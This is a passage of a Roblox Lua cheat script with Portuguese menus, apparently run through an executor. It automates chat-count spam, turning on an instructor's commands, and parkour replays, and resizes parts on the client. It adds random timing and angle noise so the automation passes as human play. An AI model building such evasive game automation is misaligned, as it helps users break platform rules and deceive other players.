            and InputBar.TargetTextChannel:IsA("TextChannel") then

            CurrentChannel = InputBar.TargetTextChannel
        end
    end))

    if InputBar.TargetTextChannel and InputBar.TargetTextChannel:IsA("TextChannel") then
        CurrentChannel = InputBar.TargetTextChannel
    end
end

local Character = {}

Character.__index = Character

function Character.new(Player)
	local self = setmetatable({}, Character)
	
	self.Player = Player
	self.Connections = {}
	
	self.Character = Player.Character or Player.CharacterAdded:Wait()
	self.Humanoid = self.Character:WaitForChild("Humanoid", 95)
	self.Root = self.Character:WaitForChild("HumanoidRootPart", 95)
	
	table.insert(self.Connections, Player.CharacterAdded:Connect(function(Char)
		self.Character = Char
		self.Humanoid = Char:WaitForChild("Humanoid", 95)
		self.Root = Char:WaitForChild("HumanoidRootPart", 95)
	end))
	
	return self
end

function Character:ChangeHumanoidState(stateEnum)
	if not self.Humanoid then return false end
	
	local success = pcall(function()
		self.Humanoid:ChangeState(stateEnum)
	end)
	return success
end

function Character:Jump()
	if not self.Humanoid then return false end
	
	local state = self.Humanoid:GetState()
	if state == Enum.HumanoidStateType.Running
	or state == Enum.HumanoidStateType.RunningNoPhysics
	or state == Enum.HumanoidStateType.Landed then
	
		return self:ChangeHumanoidState(Enum.HumanoidStateType.Jumping)
	end
	
	return false
end

local Char = Character.new(Player)

local accentMap = {
    ["á"]="Á",["à"]="À",["ã"]="Ã",["â"]="Â",
    ["é"]="É",["ê"]="Ê",
    ["í"]="Í",
    ["ó"]="Ó",["ô"]="Ô",["õ"]="Õ",
    ["ú"]="Ú",
    ["ç"]="Ç"
}

local function unicodeUpper(str)
    local out = {}
    for _,c in utf8.codes(str) do
        local ch = utf8.char(c)
        out[#out+1] = accentMap[ch] or string.upper(ch)
    end
    return table.concat(out)
end

local units = {
    [0]="zero",[1]="um",[2]="dois",[3]="três",[4]="quatro",[5]="cinco",
    [6]="seis",[7]="sete",[8]="oito",[9]="nove",[10]="dez",[11]="onze",
    [12]="doze",[13]="treze",[14]="catorze",[15]="quinze",[16]="dezesseis",
    [17]="dezessete",[18]="dezoito",[19]="dezenove"
}

local tens = {
    [2]="vinte",[3]="trinta",[4]="quarenta",[5]="cinquenta",
    [6]="sessenta",[7]="setenta",[8]="oitenta",[9]="noventa"
}

local hundreds = {
    [1]="cento",[2]="duzentos",[3]="trezentos",[4]="quatrocentos",
    [5]="quinhentos",[6]="seiscentos",[7]="setecentos",[8]="oitocentos",
    [9]="novecentos"
}

local scales_singular = {
    [1]="mil",[2]="milhão",[3]="bilhão",[4]="trilhão",[5]="quatrilhão"
}

local scales_plural = {
    [1]="mil",[2]="milhões",[3]="bilhões",[4]="trilhões",[5]="quatrilhões"
}

local function threeDigitToWords(n)
    if n == 0 then return "" end
    if n == 100 then return "cem" end

    local h = math.floor(n / 100)
    local rest = n % 100
    local parts = {}

    if h > 0 then table.insert(parts, hundreds[h]) end

    if rest < 20 then
        if rest > 0 then table.insert(parts, units[rest]) end
    else
        table.insert(parts, tens[math.floor(rest/10)])
        local u = rest % 10
        if u > 0 then table.insert(parts, units[u]) end
    end

    return table.concat(parts, " e ")
end

local function numberToWords(num)
    num = tonumber(num)
    if not num then return "NÚMERO INVÁLIDO" end
    if num == 0 then return "ZERO" end

    local groups = {}
    while num > 0 do
        table.insert(groups, num % 1000)
        num = math.floor(num / 1000)
    end

    local parts = {}
    for i = #groups,1,-1 do
        local val = groups[i]
        if val ~= 0 then
            local text = threeDigitToWords(val)
            if i > 1 then
                local scale = (val==1) and scales_singular[i-1] or scales_plural[i-1]
                if i == 2 and val == 1 then
                    text = "mil"
                else
                    text = text.." "..scale
                end
            end
            table.insert(parts, text)
        end
    end

    return unicodeUpper(table.concat(parts, " e "))
end


local running = false
local startValue = 1
local endValue   = 100

local delayValue = 1.5              
local randomDelayEnabled = false    
local randomMin = 1                 
local randomMax = 3                

local jumpEnabled = false           
local spacingEnabled = false        

local reverseEnabled = false        

local finishInTimeEnabled = false
local finishTotalTime = 60

local suffix = "!"
local customSuffix = ""


do
    local Auto = AutoSection:Tab({
        Title = "Auto JJ's",
        Icon = "lucide:keyboard",
        IconColor = Red
    })

    local ETAParagraph = Auto:Paragraph({
        Title = "Tempo",
        Desc  = "Aguardando...",
        Color = "Green",
        Image = "",
        ImageSize = 0,
        Thumbnail = "",
        ThumbnailSize = 0,
        Locked = false,
    })

    local function updateETA(remaining, secondsLeft)
        ETAParagraph:SetTitle("Tempo")
        ETAParagraph:SetDesc(
            string.format(
                "Restando: %d JJ's\nTempo estimado: %.1f segundos",
                remaining,
                math.max(secondsLeft, 0)
            )
        )
    end

-- Section de JJ's

local JJs = Auto:Section({
        Title = "Essenciais"
    })

    JJs:Toggle({
        Title = "Auto JJ's",
        Callback = function(v)
            running = v

            if running then
                task.spawn(function()

                    local i = startValue
                    local limit = endValue
                    local step = 1

                    if reverseEnabled then
                        i = endValue
                        limit = startValue
                        step = -1
                    end

                    local totalJJ = math.abs(endValue - startValue) + 1

                    local forcedDelay = nil
                    local estimatedFinishTime = 0

                    if finishInTimeEnabled then
                        forcedDelay = finishTotalTime / totalJJ
                        estimatedFinishTime = finishTotalTime
                    end

                    local executed = 0
                    local countdown = estimatedFinishTime

                    for num = i, limit, step do
                        if not running then break end

                        executed += 1
                        local remaining = totalJJ - executed

                        if finishInTimeEnabled then
                            countdown = finishTotalTime - (executed * forcedDelay)
                        else
                            local avgDelay = randomDelayEnabled
                                and ((randomMin + randomMax) / 2)
                                or delayValue

                            countdown = remaining * avgDelay
                        end

                        updateETA(remaining, countdown)

                        -- MENSAGEM

                        local word = numberToWords(num)
                        local finalSuffix = (customSuffix ~= "" and customSuffix) or suffix
                        local msg = spacingEnabled and (word .. " " .. finalSuffix) or (word .. finalSuffix)

                        RemoteChat:Send(msg)

                        -- PULAR
                        if jumpEnabled then
                            Char:Jump()
                        end

                        if finishInTimeEnabled and forcedDelay then
                            task.wait(forcedDelay)
                            continue
                        end

                        if randomDelayEnabled then
                            local steps = math.floor((randomMax - randomMin) / 0.1)
                            if steps < 0 then steps = 0 end

                            local randStep = math.random(0, steps)
                            local delay = randomMin + (randStep * 0.1)

                            task.wait(delay)
                        else
                            task.wait(delayValue)
                        end
                    end

                    updateETA(0, 0)
                end)
            end
        end
    })
    JJs:Space()

    JJs:Input({
        Title = "Inicial",
        Placeholder = "Ex: 1",
        Callback = function(v)
if v == "" then return end
            startValue = tonumber(v) or 1
        end
    })

    JJs:Input({
        Title = "Final",
        Placeholder = "Ex: 100",
        Callback = function(v)
if v == "" then return end
            endValue = tonumber(v) or 100
        end
    })

JJs:Toggle({
        Title = "Pular",
        Desc = "Pular ao enviar JJ's.",
        Callback = function(v)
            jumpEnabled = v
        end
    })

JJs:Toggle({
        Title = "Espaçamento",
        Desc = "Separa o sufixo do número. (Ex: UM !)",
        Callback = function(v)
            spacingEnabled = v
        end
    })
JJs:Space()

JJs:Toggle({
        Title = "Intervalo inteligente",
        Desc  = "Ignora todos os intervalos e termina exatamente no tempo indicado.",
        Callback = function(v)
            finishInTimeEnabled = v
        end
    })

    JJs:Input({
        Title = "Tempo (segundos)",
        Placeholder = "Ex: 100",
        Callback = function(v)
if v == "" then return end
            finishTotalTime = tonumber(v) or 60
        end
    })
JJs:Space()

JJs:Dropdown({
        Title = "Sufixo",
        Values = { "!", "?", ".", ",", "/" },
        Value = "!",
        Callback = function(v)
            suffix = v
        end
    })
JJs:Space()

    JJs:Input({
        Title = "Sufixo customizado",
        Placeholder = "Ex: @",
        Callback = function(v)
            customSuffix = tostring(v or "")
        end
    })

-- Section dos intervalos

local intervalos = Auto:Section({
        Title = "Intervalo"
    })

    intervalos:Input({
        Title = "Intervalo fixo (segundos)",
        Placeholder = "Ex: 1.5",
        Callback = function(v)
if v == "" then return end
            delayValue = tonumber(v) or 1.5
        end
    })
intervalos:Space()

    intervalos:Toggle({
        Title = "Intervalo dinâmico",
        Desc  = "Usa um intervalo aleatório entre mínimo e máximo.",
        Callback = function(v)
            randomDelayEnabled = v
        end
    })

    intervalos:Input({
        Title = "Valor mínimo",
        Placeholder = "Ex: 1",
        Callback = function(v)
if v == "" then return end
            randomMin = tonumber(v) or 1
        end
    })

    intervalos:Input({
        Title = "Valor máximo",
        Placeholder = "Ex: 3",
        Callback = function(v)
if v == "" then return end
            randomMax = tonumber(v) or 3
        end
    })

-- Section Extras

local Extras = Auto:Section({
        Title = "Extras"
    })

    Extras:Toggle({
        Title = "Modo reverso",
        Desc  = "Conta de trás pra frente.",
        Callback = function(v)
            reverseEnabled = v
        end
    })
end


-- VOLVERS
do
    local Enabled = false
    local InstructorName = ""
    local BaseYaw = 0
    local Connections = {}

    local CommandQueue = {}
    local Processing = false

    local SuffixSpaced = false

    local function notify(t, c)
        if Notify then
            Notify(t, c)
        end
    end

    local function disconnectAll()
        for _, c in ipairs(Connections) do
            c:Disconnect()
        end
        table.clear(Connections)
    end

    local function getHRP()
        local c = LocalPlayer.Character
        return c and c:FindFirstChild("HumanoidRootPart")
    end

    local function rand(a, b)
        return a + math.random() * (b - a)
    end

    local function isAllUpper(msg)
        return msg == msg:upper()
    end

    local function normalizeCompact(msg)
        return msg
            :upper()
            :gsub("%s+", "")
            :gsub("[^A-Z!]", "")
    end

    local function validSuffix(raw)
        if SuffixSpaced then
            return raw:find(" !", 1, true) ~= nil
        else
            return raw:find("!", 1, true) and not raw:find(" !", 1, true)
        end
    end

    local function smoothRotate(delta)
        local hrp = getHRP()
        if not hrp then return end

        local startCF = hrp.CFrame
        local targetCF = startCF * CFrame.Angles(0, delta, 0)

        local baseDuration = rand(0.5, 0.65)
        local elapsed = 0
        local noiseSeed = math.random() * 10

        local conn
        conn = RunService.Heartbeat:Connect(function(dt)
            elapsed += dt

            local speedNoise = 1 + math.sin(elapsed * 6 + noiseSeed) * 0.08
            local duration = baseDuration / speedNoise

            local alpha = math.clamp(elapsed / duration, 0, 1)
            alpha = alpha * alpha * (3 - 2 * alpha)

            hrp.CFrame = startCF:Lerp(targetCF, alpha)

            if alpha >= 1 then
                conn:Disconnect()
            end
        end)
    end

    local function returnBase()
        local hrp = getHRP()
        if not hrp then return end

        local startCF = hrp.CFrame
        local targetCF = CFrame.new(hrp.Position) * CFrame.Angles(0, BaseYaw, 0)

        local baseDuration = rand(0.5, 0.65)
        local elapsed = 0
        local noiseSeed = math.random() * 10

        local conn
        conn = RunService.Heartbeat:Connect(function(dt)
            elapsed += dt

            local speedNoise = 1 + math.sin(elapsed * 6 + noiseSeed) * 0.08
            local duration = baseDuration / speedNoise

            local alpha = math.clamp(elapsed / duration, 0, 1)
            alpha = alpha * alpha * (3 - 2 * alpha)

            hrp.CFrame = startCF:Lerp(targetCF, alpha)

            if alpha >= 1 then
                conn:Disconnect()
            end
        end)
    end

    local function enqueue(action, label)
        table.insert(CommandQueue, action)
        Notify("Auto volver's", "Fileira: " .. label)

        if not Processing then
            Processing = true
            task.spawn(function()
                while #CommandQueue > 0 and Enabled do
                    local cmd = table.remove(CommandQueue, 1)
                    task.wait(rand(0.3, 0.5))
                    cmd()
                    task.wait(rand(0.15, 0.25))
                end
                Processing = false
            end)
        end
    end

    local function handle(msg)
        if not isAllUpper(msg) then
            Notify("Auto volver's", "Ignorado (não está em maiúsculo).")
            return
        end

        if not validSuffix(msg) then
            Notify("Auto volver's", "Ignorado (sufixo errado).")
            return
        end

        local compact = normalizeCompact(msg)

        if compact == "DIREITAVOLVER!" then
            enqueue(function()
                smoothRotate(-math.rad(rand(80, 100)))
            end, "DIREITA VOLVER")

        elseif compact == "ESQUERDAVOLVER!" then
            enqueue(function()
                smoothRotate(math.rad(rand(80, 100)))
            end, "ESQUERDA VOLVER")

        elseif compact == "RETAGUARDAVOLVER!" then
            enqueue(function()
                smoothRotate(math.rad(rand(170, 190)))
            end, "RETAGUARDA VOLVER")

        elseif compact == "VANGUARDAVOLVER!" then
            enqueue(returnBase, "VANGUARDA VOLVER")
        end
    end

    local function hookLegacyChat()
        for _, plr in ipairs(Players:GetPlayers()) do
            local conn = plr.Chatted:Connect(function(msg)
                if Enabled and plr.Name:lower() == InstructorName:lower() then
                    handle(msg)
                end
            end)
            table.insert(Connections, conn)
        end

        table.insert(Connections, Players.PlayerAdded:Connect(function(plr)
            local conn = plr.Chatted:Connect(function(msg)
                if Enabled and plr.Name:lower() == InstructorName:lower() then
                    handle(msg)
                end
            end)
            table.insert(Connections, conn)
        end))
    end

    local function hookTextChat()
        local signal = TextChatService.OnIncomingMessage
        if typeof(signal) ~= "RBXScriptSignal" then
            hookLegacyChat()
            return
        end

        local conn = signal:Connect(function(message)
            if not Enabled or not message.TextSource then return end
            local plr = Players:GetPlayerByUserId(message.TextSource.UserId)
            if plr and plr.Name:lower() == InstructorName:lower() then
                handle(message.Text)
            end
        end)

        table.insert(Connections, conn)
    end

    local function enable()
        disconnectAll()
        table.clear(CommandQueue)

        local hrp = getHRP()
        if hrp then
            local _, y, _ = hrp.CFrame:ToOrientation()
            BaseYaw = y
        end

        Notify("Auto volver's", "Ativado.")

        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            hookTextChat()
        else
            hookLegacyChat()
        end
    end

    local function disable()
        disconnectAll()
        table.clear(CommandQueue)
        Processing = false
        Notify("Auto volver's", "Desativado.")
    end

    local Volvers = AutoSection:Tab({
        Title = "Auto volver's",
        Icon = "lucide:arrow-right-left",
        IconColor = Color3.fromHex("#F0DCC0")
    })

    Volvers:Input({
        Title = "Instrutor",
        Placeholder = "Nome do instrutor",
        Callback = function(v)
            if v ~= "" then
            InstructorName = v
           end
        end
    })

    Volvers:Toggle({
        Title = "Sufixo espaçado",
        Desc = 'Aceita somente se o sufixo "!" estiver espaçado ou não. DIREITA VOLVER! ≠ DIREITA VOLVER !',
        Callback = function(v)
            SuffixSpaced = v
        end
    })

    Volvers:Toggle({
        Title = "Ativar",
        Desc = "Ativa o auto volver's.",
        Callback = function(v)
            Enabled = v
            if v then enable() else disable() end
        end
    })
end



local PlayerGui = player:WaitForChild("PlayerGui")
local CurrentCamera = Workspace.CurrentCamera

--// CUSTOMIZAÇÃO
local BASE_COLOR_POS = Color3.fromRGB(255, 255, 255)
local BASE_COLOR_LOOK = Color3.fromRGB(59, 255, 56)
local MATERIAL_INDICATOR = Enum.Material.Neon
local TRANSPARENCY_INDICATOR = 0.05
local VIEWPORT_SIZE = UDim2.new(0, 150, 0, 150)
local PATH_COLOR = Color3.fromRGB(0, 255, 17)
local PATH_THICKNESS = 0.15

--// GUI
local TAS_GUI = Instance.new("ScreenGui")
TAS_GUI.Name = "Gravador"
TAS_GUI.Parent = PlayerGui

--// VIEWPORT
local ActiveViewports = {}

local function createViewportMarker(partToTrack)
    local viewportFrame = Instance.new("ViewportFrame")
    viewportFrame.Parent = TAS_GUI
    viewportFrame.BackgroundTransparency = 1
    viewportFrame.Size = VIEWPORT_SIZE
    viewportFrame.ZIndex = 10

    local viewportCamera = Instance.new("Camera")
    viewportCamera.Parent = viewportFrame

    local clone = partToTrack:Clone()
    clone.Parent = viewportFrame
    clone.Transparency = TRANSPARENCY_INDICATOR
    clone.Material = MATERIAL_INDICATOR
    clone.CFrame = CFrame.new()

    local maxDimension = math.max(clone.Size.X, clone.Size.Y, clone.Size.Z)
    viewportCamera.CFrame =
        CFrame.new(0, 0, maxDimension * 3) *
        CFrame.Angles(0, math.rad(180), 0)

    local conn = RunService.Stepped:Connect(function()
        if not partToTrack or not partToTrack.Parent then return end
        local pos, visible = CurrentCamera:WorldToScreenPoint(partToTrack.Position)
        viewportFrame.Position = UDim2.fromOffset(
            pos.X - viewportFrame.Size.X.Offset / 2,
            pos.Y - viewportFrame.Size.Y.Offset / 2
        )
        viewportFrame.Visible = visible
    end)

    table.insert(ActiveViewports, {
        Frame = viewportFrame,
        Connection = conn,
        Part = partToTrack
    })
end

--// FOLDER
local TAS_FOLDER = "fp3_Parkours"
if writefile and not isfolder(TAS_FOLDER) then
    makefolder(TAS_FOLDER)
end

--// STATE
local Recording = false
local Playing = false
local WaitingForStart = false
local RequestedPlay = false
local Frames = {}
local PathParts = {}

local RecordConn, PlayConn, MarkerConn
local CurrentName, SelectedTAS
local TASDropdown
local StartMarker, LookArrow

--// CHARACTER UTILS
local function getHRP()
    local c = player.Character
    return c and c:FindFirstChild("HumanoidRootPart")
end

local function getHumanoid()
    local c = player.Character
    return c and c:FindFirstChildOfClass("Humanoid")
end

--// FRAME CAPTURE (Melhorado)
local function captureFrame()
    local hrp = getHRP()
    local hum = getHumanoid()
    if not hrp or not hum then return end

    return {
        cf   = { hrp.CFrame:GetComponents() },
        cam  = { CurrentCamera.CFrame:GetComponents() },
        -- Usando AssemblyLinearVelocity para maior precisão física
        lvel = { hrp.AssemblyLinearVelocity.X, hrp.AssemblyLinearVelocity.Y, hrp.AssemblyLinearVelocity.Z },
        -- Adicionado Angular Velocity para rotações
        avel = { hrp.AssemblyAngularVelocity.X, hrp.AssemblyAngularVelocity.Y, hrp.AssemblyAngularVelocity.Z },
        jump = hum.Jump,
        state = hum:GetState() -- Salva o estado (caindo, pulando, etc)
    }
end

local function applyFrame(f)
    local hrp = getHRP()
    local hum = getHumanoid()
    if not hrp or not hum then return end

    -- Aplica CFrame
    hrp.CFrame = CFrame.new(unpack(f.cf))
    
    -- Aplica Velocidades Físicas (Evita bugs de inércia ao pausar)
    if f.lvel then
        hrp.AssemblyLinearVelocity = Vector3.new(unpack(f.lvel))
    end
    if f.avel then
        hrp.AssemblyAngularVelocity = Vector3.new(unpack(f.avel))
    end

    CurrentCamera.CFrame = CFrame.new(unpack(f.cam))
    hum.Jump = f.jump
    
    -- Opcional: Forçar estado se necessário, mas CFrame geralmente resolve
    -- if f.state then hum:ChangeState(f.state) end
end

--// RECORD
local function startRecording()
    if Recording then return end
    Frames = {}
    Recording = true

    RecordConn = RunService.Heartbeat:Connect(function()
        local frame = captureFrame()
        if frame then
            Frames[#Frames + 1] = frame
        end
    end)

    Notify("Gravador", "Gravação iniciada")
end

local function stopRecording()
    if not Recording then return end
    Recording = false
    if RecordConn then
        RecordConn:Disconnect()
        RecordConn = nil
    end

    Notify("Gravador", "Gravação parada (" .. #Frames .. " frames)")
end

--// PAUSE (Novo)
local function pausePlayback()
    if not Playing then return end
    
    -- Desconecta o loop de reprodução
    if PlayConn then 
        PlayConn:Disconnect() 
        PlayConn = nil 
    end
    
    Playing = false
    
    -- Reseta a velocidade residual para o jogador não sair voando ao retomar o controle
    local hrp = getHRP()
    if hrp then
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
    end
    
    Notify("Play", "Reprodução PAUSADA. Controle retomado.")
end

--// CHAT COMMANDS
local function onChatCommand(msg)
    msg = msg:lower()
    if msg == "/e gravar" then
        startRecording()
    elseif msg == "/e parar" then
        stopRecording()
    elseif msg == "/e pausar" then -- Novo comando
        pausePlayback()
    end
end

if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    TextChatService.OnIncomingMessage = function(message)
        if message.TextSource and message.TextSource.UserId == player.UserId then
            onChatCommand(message.Text)
        end
    end
else
    player.Chatted:Connect(onChatCommand)
end

--// PATH LINE
local function buildPathLine()
    for _, p in ipairs(PathParts) do
        if p then p:Destroy() end
    end
    PathParts = {}

    if not Frames or #Frames < 2 then return end

    for i = 1, #Frames - 1 do
        local startPos = Vector3.new(unpack(Frames[i].cf))
        local endPos   = Vector3.new(unpack(Frames[i+1].cf))
        local dist = (endPos - startPos).Magnitude

        -- Otimização: Não desenhar se a distância for muito pequena (parado)
        if dist > 0.1 then
            local part = Instance.new("Part")
            part.Anchored = true
            part.CanCollide = false
            part.Material = Enum.Material.Neon
            part.Color = PATH_COLOR
            part.Size = Vector3.new(PATH_THICKNESS, PATH_THICKNESS, dist)
            part.CFrame = CFrame.new(startPos:Lerp(endPos, 0.5), endPos)
            part.Parent = Workspace
            table.insert(PathParts, part)
        end
    end
end

--// MARKERS
local function clearMarker()
    WaitingForStart = false
    if MarkerConn then MarkerConn:Disconnect() MarkerConn = nil end
    if PlayConn then PlayConn:Disconnect() PlayConn = nil end

    if StartMarker then StartMarker:Destroy() StartMarker = nil end
    if LookArrow then LookArrow:Destroy() LookArrow = nil end

    for _, vp in ipairs(ActiveViewports) do
        if vp.Connection then vp.Connection:Disconnect() end
        if vp.Frame then vp.Frame:Destroy() end
        if vp.Part and vp.Part.Parent == Workspace then
            vp.Part:Destroy()
        end
    end
    ActiveViewports = {}

    for _, p in ipairs(PathParts) do
        if p then p:Destroy() end
    end
    PathParts = {}
end

local function createStartCircle(cf)
    clearMarker()
    WaitingForStart = true

    local container = Instance.new("Folder", Workspace)
    container.Name = "marcador"

    local function marker(name, shape, size, cframe, color)
        local p = Instance.new("Part")
        p.Name = name
        p.Shape = shape
        p.Size = size
        p.CFrame = cframe
        p.Anchored = true
        p.CanCollide = false
        p.Material = MATERIAL_INDICATOR
        p.Color = color
        p.Transparency = TRANSPARENCY_INDICATOR
        p.CastShadow = false
        p.Parent = container
        return p
    end

    StartMarker = marker("start", Enum.PartType.Cylinder, Vector3.new(0.25, 4, 4), cf * CFrame.Angles(0, 0, math.rad(90)), BASE_COLOR_POS)
    local shaft = marker("seta", Enum.PartType.Block, Vector3.new(0.5, 0.1, 1.5), cf * CFrame.new(0,1,-0.75), BASE_COLOR_LOOK)
    local tip = marker("seta2", Enum.PartType.Block, Vector3.new(1,0.1,0.5), cf * CFrame.new(0,1,-1.75), BASE_COLOR_LOOK)

    LookArrow = container

    createViewportMarker(StartMarker)
    createViewportMarker(shaft)
    createViewportMarker(tip)

    if RequestedPlay then
        buildPathLine()
    end

    MarkerConn = RunService.Heartbeat:Connect(function()
        local hrp = getHRP()
        if not hrp then return end

        local delta = hrp.Position - cf.Position
        local flatDist = Vector3.new(delta.X,0,delta.Z).Magnitude
        local dot = hrp.CFrame.LookVector:Dot(cf.LookVector)

        -- Tolerância para iniciar
        if flatDist <= 2 and math.abs(delta.Y) <= 1 and dot >= math.cos(math.rad(10)) then
            clearMarker()
            Playing = true

            local i = 1
            -- MUDANÇA IMPORTANTE: Stepped em vez de Heartbeat para suavizar a física
            PlayConn = RunService.Stepped:Connect(function()
                if i > #Frames then
                    PlayConn:Disconnect()
                    Playing = false
                    RequestedPlay = false
                    -- Não desativamos o toggle na UI para permitir replay rápido, se desejar
                    Notify("Play", "Reprodução finalizada.")
                    return
                end
                applyFrame(Frames[i])
                i += 1
            end)
        end
    end)
end

--// PLAY
local function playTAS()
    if not RequestedPlay then return end
    if Playing or WaitingForStart then return end
    if not Frames or #Frames == 0 then
        Notify("Play", "Selecione uma gravação primeiro.")
        return
    end
    createStartCircle(CFrame.new(unpack(Frames[1].cf)))
end

--// FILES
local function getSavedTAS()
    local out = {}
    if listfiles then
        for _, f in ipairs(listfiles(TAS_FOLDER)) do
            if f:sub(-5) == ".json" then
                out[#out + 1] = f:match("([^/]+)%.json$")
            end
        end
    end
    return out
end

local function saveCurrentTAS()
    if not CurrentName or CurrentName == "" or #Frames == 0 then return end
    writefile(TAS_FOLDER .. "/" .. CurrentName .. ".json", HttpService:JSONEncode({ Version = 2, Frames = Frames })) -- Versão 2
    TASDropdown:Refresh(getSavedTAS())
end

local function loadTAS(name)
    clearMarker()
    if not name or name == "" then
        Frames = {}
        SelectedTAS = nil
        return
    end

    local path = TAS_FOLDER .. "/" .. name .. ".json"
    if not isfile(path) then return end

    Frames = HttpService:JSONDecode(readfile(path)).Frames or {}
    SelectedTAS = name
end

local function deleteTAS()
    if not SelectedTAS then
        Notify("Deletar", "Nenhuma gravação selecionada.")
        return
    end

    local path = TAS_FOLDER .. "/" .. SelectedTAS .. ".json"
    if isfile(path) then delfile(path) end

    SelectedTAS = nil
    Frames = {}
    TASDropdown:Set("")
    TASDropdown:Refresh(getSavedTAS())
end

--// UI
local TAS = ParkourSection:Tab({
    Title = "Gravador",
    Icon = "lucide:video",
    IconColor = Color3.fromHex("#ED6DED")
})

TAS:Toggle({
    Title = "Habilitar Play",
    Callback = function(v)
        RequestedPlay = v
        if v then
            playTAS()
        else
            if WaitingForStart then
                clearMarker()
            end
            if Playing then
                -- Se desabilitar o toggle durante o play, para tudo
                pausePlayback()
            end
        end
    end
})

TASDropdown = TAS:Dropdown({
    Title = "Selecionar gravação",
    Values = getSavedTAS(),
    Callback = loadTAS
})

TAS:Button({ Title = "Deletar gravação", Callback = deleteTAS })
TAS:Space()

TAS:Input({
    Title = "Nome do TAS",
    Callback = function(v)
        if v ~= "" then CurrentName = v end
    end
})
TAS:Space()

TAS:Paragraph({
    Title = "Observação",
    Desc = "Comandos: /e gravar, /e parar, /e pausar."
})
TAS:Space()

local g = TAS:Group()
g:Button({ Title = "Gravar", Callback = startRecording })
g:Button({ Title = "Parar Gravação", Callback = stopRecording })
g:Space()
-- Botão de Pausar Adicionado
g:Button({ Title = "PAUSAR PLAY", Callback = pausePlayback }) 

TAS:Space()
TAS:Button({ Title = "Salvar gravação", Callback = saveCurrentTAS })



-- F3X
do
    local Mouse = Player:GetMouse()

    local F3X_FOLDER = "fp3_F3X"
    if writefile and not isfolder(F3X_FOLDER) then
        makefolder(F3X_FOLDER)
    end

    local Enabled = false
    local SelectedParts = {}
    local Highlights = {}
    local UndoStack = {}
    local RedoStack = {}
    local ModifiedParts = {}

    local SelectedConfig
    local CurrentConfigName

    local TOLERANCE = 1

    local function round(n)
        return math.floor(n * 10 + 0.5) / 10
    end

    local function sizeMatch(a, b)
        return math.abs(a.X - b.X) <= TOLERANCE
           and math.abs(a.Y - b.Y) <= TOLERANCE
           and math.abs(a.Z - b.Z) <= TOLERANCE
    end

    local function clearHighlights()
        for _, h in ipairs(Highlights) do
            if h then h:Destroy() end
        end
        table.clear(Highlights)
    end

    local function clearSelection()
        table.clear(SelectedParts)
        clearHighlights()
        InfoParagraph:SetTitle("Nenhuma seleção")
        InfoParagraph:SetDesc("")
    end

    local function highlight(part)
        local h = Instance.new("Highlight")
        h.FillTransparency = 1
        h.OutlineTransparency = 0
        h.OutlineColor = Color3.fromRGB(0, 255, 255)
        h.Parent = part
        table.insert(Highlights, h)
    end

    local function updateUI()
        if #SelectedParts == 0 then
            InfoParagraph:SetTitle("Nenhuma seleção")
            InfoParagraph:SetDesc("")
            return
        end

        local s = SelectedParts[1].Size

        InfoParagraph:SetTitle(SelectedParts[1].Name)
        InfoParagraph:SetDesc(
            "X: " .. round(s.X) ..
            "\nY: " .. round(s.Y) ..
            "\nZ: " .. round(s.Z)
        )

        InputX:Set(tostring(round(s.X)))
        InputY:Set(tostring(round(s.Y)))
        InputZ:Set(tostring(round(s.Z)))
    end

    local function pushUndo()
        local snap = {}
        for _, p in ipairs(SelectedParts) do
            snap[p] = p.Size
        end
        table.insert(UndoStack, snap)
        table.clear(RedoStack)
    end

    local function applySize(v)
        pushUndo()
        for _, p in ipairs(SelectedParts) do
            p.Size = v
            ModifiedParts[p] = v
        end
        updateUI()
    end

    local function undo()
        local s = table.remove(UndoStack)
        if not s then return end
        local redo = {}
        for p, size in pairs(s) do
            redo[p] = p.Size
            p.Size = size
            ModifiedParts[p] = size
        end
        table.insert(RedoStack, redo)
        updateUI()
    end

    local function redo()
        local s = table.remove(RedoStack)
        if not s then return end
        local undo = {}
        for p, size in pairs(s) do
            undo[p] = p.Size
            p.Size = size
            ModifiedParts[p] = size
        end
        table.insert(UndoStack, undo)
        updateUI()
    end

    Mouse.Button1Down:Connect(function()
        if not Enabled then return end
        local t = Mouse.Target
        if not t or not t:IsA("BasePart") then return end

        for i, p in ipairs(SelectedParts) do
            if p == t then
                table.remove(SelectedParts, i)
                clearHighlights()
                for _, sp in ipairs(SelectedParts) do
                    highlight(sp)
                end
                updateUI()
                return
            end
        end

        if #SelectedParts > 0 and not sizeMatch(SelectedParts[1].Size, t.Size) then
            Notify("F3X", "Os itens selecionados devem ter o mesmo tamanho.")
            return
        end

        table.insert(SelectedParts, t)
        highlight(t)
        updateUI()
    end)

    local function listConfigs()
        local out = {}
        if listfiles then
            for _, f in ipairs(listfiles(F3X_FOLDER)) do
                if f:sub(-5) == ".json" then
                    out[#out + 1] = f:match("([^/]+)%.json$")
                end
            end
        end
        return out
    end

    local function saveConfig(name)
        if not name or name == "" then
            Notify("F3X", "Nome inválido.")
            return
        end

        local data = {
            PlaceId = game.PlaceId,
            Parts = {}
        }

        for part, size in pairs(ModifiedParts) do
            if part and part.Parent then
                data.Parts[#data.Parts + 1] = {
                    Path = part:GetFullName(),
                    CFrame = { part.CFrame:GetComponents() },
                    Size = { size.X, size.Y, size.Z }
                }
            end
        end

        writefile(F3X_FOLDER .. "/" .. name .. ".json", HttpService:JSONEncode(data))
        ConfigDropdown:Refresh(listConfigs())
        Notify("F3X", "Config salva")
    end

    local function applyConfig(name)
        if not name then return end
        local path = F3X_FOLDER .. "/" .. name .. ".json"
        if not isfile(path) then return end

        local data = HttpService:JSONDecode(readfile(path))

        if data.PlaceId ~= game.PlaceId then
            Notify("F3X", "Essa configuração não é desse mapa.")
            return
        end

        for _, v in ipairs(data.Parts or {}) do
            local cf = CFrame.new(unpack(v.CFrame))
            for _, obj in ipairs(Workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj:GetFullName() == v.Path then
                    if (obj.Position - cf.Position).Magnitude < 1 then
                        obj.Size = Vector3.new(unpack(v.Size))
                        break
                    end
                end
            end
        end

        Notify("F3X", "Aplicada.")
    end

    local function deleteConfig()
        if not SelectedConfig then
            Notify("F3X", "Nenhuma configuração selecionada.")
            return
        end
        delfile(F3X_FOLDER .. "/" .. SelectedConfig .. ".json")
        SelectedConfig = nil
        ConfigDropdown:Refresh(listConfigs())
        Notify("F3X", "Deletada.")
    end

    local F3X = ParkourSection:Tab({
        Title = "F3X",
        Icon = "lucide:pencil"
